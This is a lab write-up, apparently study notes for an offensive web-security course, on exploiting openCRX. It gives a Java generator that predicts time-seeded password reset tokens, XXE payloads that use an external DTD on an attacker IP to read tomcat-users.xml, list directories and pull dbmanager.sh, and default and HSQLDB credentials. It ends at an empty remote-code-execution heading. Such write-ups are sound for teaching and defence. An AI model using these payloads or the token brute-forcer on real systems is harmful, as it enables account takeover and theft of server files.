# openCRX Authentication Bypass and Remote Code Execution
This module covers the analysis and exploitation of multiple vulnerabilities in openCRX, an open-source Java-based CRM application. Using white box techniques, we exploited **predictable password reset tokens** to gain authenticated access. From there, we combined white and black box approaches to exploit an XXE vulnerability, enumerate the server, extract **HSQLDB credentials**, and leverage Java routines to achieve limited **remote code execution** and deploy a web shell on the server.
## Vulnerability Discovery
In its default setup, openCRX runs on Apache TomEE, and like many Java web applications, it may be packaged as a JAR, WAR, or EAR file—essentially ZIP files with different purposes:

- **JAR:** Stand-alone apps or libraries
- **WAR:** Web apps with static content and JARs
- **EAR:** Bundles multiple WARs and JARs for enterprise apps

While packaging format doesn’t affect exploitability, understanding it helps locate target files.

To analyze openCRX’s structure, we use white box techniques, connecting via SSH and running:
```bash
tree -L 3
```
```bash
student@opencrx:~$ cd crx/apache-tomee-plus-7.0.5/

student@opencrx:~/crx/apache-tomee-plus-7.0.5$ tree -L 3
.
|-- airsyncdir
|-- apps
|   |-- opencrx-core-CRX
|   |   |-- APP-INF
|   |   |-- META-INF
|   |   |-- opencrx-bpi-CRX
|   |   |-- opencrx-bpi-CRX.war
|   |   |-- opencrx-caldav-CRX
|   |   |-- opencrx-caldav-CRX.war
|   |   |-- opencrx-calendar-CRX
|   |   |-- opencrx-calendar-CRX.war
|   |   |-- opencrx-carddav-CRX
|   |   |-- opencrx-carddav-CRX.war
|   |   |-- opencrx-contacts-CRX
|   |   |-- opencrx-contacts-CRX.war
|   |   |-- opencrx-core-CRX
|   |   |-- opencrx-core-CRX.war
|   |   |-- opencrx-documents-CRX
|   |   |-- opencrx-documents-CRX.war
|   |   |-- opencrx-ical-CRX
|   |   |-- opencrx-ical-CRX.war
|   |   |-- opencrx-imap-CRX
|   |   |-- opencrx-imap-CRX.war
|   |   |-- opencrx-ldap-CRX
|   |   |-- opencrx-ldap-CRX.war
|   |   |-- opencrx-rest-CRX
|   |   |-- opencrx-rest-CRX.war
|   |   |-- opencrx-spaces-CRX
|   |   |-- opencrx-spaces-CRX.war
|   |   |-- opencrx-vcard-CRX
|   |   |-- opencrx-vcard-CRX.war
|   |   |-- opencrx-webdav-CRX
|   |   |-- opencrx-webdav-CRX.war
|   |-- opencrx-core-CRX.ear
|-- bin
...

55 directories, 339 files
```
We confirmed that openCRX is packaged as an EAR file located at: `/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear`

Inside, we found multiple WAR files, each representing a separate web application, eliminating the need to extract them individually.

use `scp` to copy `opencrx-core-CRX.ear` to our local Kali machine.
```bash
scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
```
Next, we'll unzip it, passing in `-d` opencrx to extract the contents into a new directory.
```bash
unzip -q opencrx-core-CRX.ear -d opencrx
```
Once we have extracted the contents of the EAR file, we can examine them on our Kali machine.
```bash
kali@kali:~$ cd opencrx

kali@kali:~/opencrx$ ls -al
total 29184
drwxr-xr-x  4 kali kali     4096 Feb 27 14:19 .
drwxr-xr-x 51 kali kali     4096 Feb 27 14:19 ..
drwxr-xr-x  3 kali kali     4096 Jan  2  2019 APP-INF
drwxr-xr-x  2 kali kali     4096 Jan  2  2019 META-INF
-rw-r--r--  1 kali kali     2028 Jan  2  2019 opencrx-bpi-CRX.war
-rw-r--r--  1 kali kali     2027 Jan  2  2019 opencrx-caldav-CRX.war
-rw-r--r--  1 kali kali  3908343 Jan  2  2019 opencrx-calendar-CRX.war
-rw-r--r--  1 kali kali     2030 Jan  2  2019 opencrx-carddav-CRX.war
-rw-r--r--  1 kali kali  3675357 Jan  2  2019 opencrx-contacts-CRX.war
-rw-r--r--  1 kali kali 18285302 Jan  2  2019 opencrx-core-CRX.war
-rw-r--r--  1 kali kali  1099839 Jan  2  2019 opencrx-documents-CRX.war
-rw-r--r--  1 kali kali     2750 Jan  2  2019 opencrx-ical-CRX.war
-rw-r--r--  1 kali kali     1785 Jan  2  2019 opencrx-imap-CRX.war
-rw-r--r--  1 kali kali     1788 Jan  2  2019 opencrx-ldap-CRX.war
-rw-r--r--  1 kali kali  2778171 Jan  2  2019 opencrx-rest-CRX.war
-rw-r--r--  1 kali kali    70520 Jan  2  2019 opencrx-spaces-CRX.war
-rw-r--r--  1 kali kali     2036 Jan  2  2019 opencrx-vcard-CRX.war
-rw-r--r--  1 kali kali     2029 Jan  2  2019 opencrx-webdav-CRX.war
```
As we suspected earlier, the EAR file did contain the WAR files. Each WAR file is essentially a separate web application with its own static content. The common JAR files are in `/APP-INF/lib`.

We will come back to these JAR files. First, let's examine the main application, `opencrx-core-CRX.war`, in JD-GUI.

We start with JSP files rather than `web.xml` because openCRX embeds key logic and functionality directly within them. This approach allows for faster identification of dynamic behavior and potential vulnerabilities without tracing servlet mappings.

### Password Reset Analysis
While analyzing the WAR file in JD-GUI, we identified JSP files related to authentication and password resets. Since these areas often contain vulnerabilities that can lead to unauthorized access, we focus first on `RequestPasswordReset.jsp` to understand how openCRX handles password resets and assess it for potential exploitation.

The file also contains additional application logic. The application code that handles password resets starts near the end of the file, around line `153`.
```java
		if(principalName != null && providerName != null && segmentName != null) {
			javax.jdo.PersistenceManagerFactory pmf = org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
			javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(
				SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + segmentName, 
				null
			);
			try {
				org.opencrx.kernel.home1.jmi1.UserHome userHome = (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
					new Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", providerName, "segment", segmentName, "userHome", principalName)
				);
				pm.currentTransaction().begin();
				userHome.requestPasswordReset();
				pm.currentTransaction().commit();
				success = true;
			} catch(Exception e) {
				try {
					pm.currentTransaction().rollback();
				} catch(Exception ignore) {}
				success = false;
			}
		} else {
			success = false;
		}

```
To trace the password reset logic in openCRX, we examined a code block where execution depends on `principalName`, `providerName`, and `segmentName` being non-null. The code uses these values to retrieve a `UserHome` object and then calls its `requestPasswordReset` method.

Since the `UserHome` class wasn't found in the current WAR file (no clickable link in JD-GUI), we checked the `application.xml` file inside the EAR’s `META-INF` directory. It revealed that external libraries are located in `APP-INF/lib`.

Based on this, we conclude the `UserHome` class is likely inside `opencrx-kernel.jar`, found in `APP-INF/lib`. We'll examine this JAR next to continue analyzing the password reset mechanism.

The `getRandomBase62` method used for generating password reset tokens in openCRX is insecure due to predictable randomness.

The `requestPasswordReset` function ultimately generates a reset token using:
```java
324 public void requestPasswordReset(UserHome userHome) throws ServiceException {
...   
336     String webAccessUrl = userHome.getWebAccessUrl();
337     if (webAccessUrl != null) {
338       String resetToken = Utils.getRandomBase62(40);
...       
341       String name = providerName + "/" + segmentName + " Password Reset";
342       String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
343       String resetCancelUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetCancel.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
...     
363       changePassword((Password)loginPrincipal
364           .getCredential(), null, "{RESET}" + resetToken);
365     } 
366   }
```
the key issue from `getRandomBase62` is that `java.util.Random` is not cryptographically secure:
```java
1038   public static String getRandomBase62(int length) {
1039      String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
1040     Random random = new Random(System.currentTimeMillis());
1041     String s = "";
1042     for (int i = 0; i < length; i++) {
1043       s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
1044     }
1045     return s;
1046   }
```
Seeding it with `System.currentTimeMillis()` makes it deterministic and predictable—an attacker could guess the seed value if they know the approximate time the token was generated.
### When Random Isn't
The standard Java libraries have two primary random number generators: `java.util.Random` and `java.security.SecureRandom`. The names are somewhat of a giveaway here.

The openCRX application uses `java.util.Random` seeded with `System.currentTimeMillis()` to generate password reset tokens, making them predictable. If an attacker can estimate when a token was generated, they can reproduce the token by seeding their own Random object with similar timestamps. This could allow brute-forcing of valid tokens—especially if there are no rate limits or lockouts. However, a valid user account is still needed as a target.

A default installation of openCRX has three accounts with the following username and password pairs:

1. `guest` / `guest`
2. `admin-Standard` / `admin-Standard`
3. `admin-Root` / `admin-Root`
### Timing the reset request
To generate the correct password reset token, we need to guess the exact millisecond the token was created, since that's the seed used by `System.currentTimeMillis()`. Fortunately, the method returns time in UTC, so time zone differences aren’t a concern.

We can get the milliseconds "since the epoch" using Python `time()` function:
```bash
$ python3 -c "import time; print(int(time.time() * 1000))"
1753476249633
```
This format will match the output of the Java method in milliseconds.

To determine the seed range for generating the correct password reset token, we can use the `int(time.time() * 1000)` command immediately before and after sending the reset request with `requests`. This gives us the range of possible `System.currentTimeMillis()` values.
### Generate Token List
To exploit the predictable token generation in openCRX, you’ll need to write a custom Java class that mimics how the application generates its password reset tokens. Below is a simplified version of such a generator based on the `getRandomBase62(int length)` method found in openCRX’s `Utils` class.
```java
/*
Compile before usage: javac OpenCRXToken.java
Usage: java OpenCRXToken <start_timestamp> <stop_timestamp> > tokens.txt
*/
import java.util.Random;
public class OpenCRXToken {
    public static void main(String args[]) {
        int length = 40;
        if(args.length < 1){
            System.out.println("\n[!] Usage: java OpenCRXToken <start_timestamp> <stop_timestamp>");
            System.exit(0);
        }
        long start = Long.parseLong(args[0]);
        long stop = Long.parseLong(args[1]);
        String token = "";
        for (long l = start; l < stop; l++) {
            token = getRandomBase62(length, l);
            System.out.println(token);
        }
    }
    public static String getRandomBase62(int length, long seed) {
        Random random = new Random(seed);
        String s = "";
        for (int i = 0; i < length; i++) {
            s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
        }
        return s;
    }
}
```
Now we can compile our token generator using: `javac OpenCRXToken.java`

Then run it: `java OpenCRXToken <start_timestamp> <stop_timestamp> > tokens.txt`
### Automating Resets
Script: https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openCRX/xxe_lfd.py#L20C21-L20C21
## XML External Entity Vulnerability
Now we can update our payload to reference this DTD file on our Kali instance. Since the application is running on TomEE, let's see if we can can get TomEE user credentials by targeting the `tomcat-users.xml` file.
```
POST /opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account HTTP/1.1
Host: opencrx:8080
Content-Type: application/xml
Authorization: Basic Z3Vlc3Q6TmV3UGFzc3dvcmQhMTIzNA==

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.176/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
**Interestingly**, the `file:///` wrapper can reference files and directories. If we modify our XXE payload to reference directories instead of files, it should return directory listings. We can use this to enumerate directories and files on the server.
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.176/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
### Gaining Remote Access to HSQLDB
We want to use this vulnerability to find files that can provide us with additional access or credentials. We can often find this information in config files, batch files, and shell scripts. After a search, we find several files related to the database at `/home/student/crx/data/hsqldb/`, including a file with credentials, `dbmanager.sh`.
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.176/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
A JDBC connection string in the file with a value of `"jdbc:hsqldb:hsql://127.0.0.1:9001/CRX"` lists a username of `"sa"` and a password of `"manager99"`. The application appears to be using HSQLDB, a Java database.

let's do a quick `nmap` scan to find out if TCP port `9001` is open.
```bash
kali@kali:~/opencrx$ nmap -p 9001 opencrx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 17:43 EDT
Nmap scan report for opencrx(192.168.215.126)
Host is up (0.00058s latency).

PORT     STATE SERVICE
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```
The database port appears to be open and we have credentials, so let's try connecting to the database and determine what we can do with it.
```bash
$ java -cp ~/hsqldb-2.7.4/hsqldb/lib/hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
```
After a few moments, a new GUI window should open.
**Exploitation Script:** https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openCRX/xxe_lfd.py
## Remote Code Execution
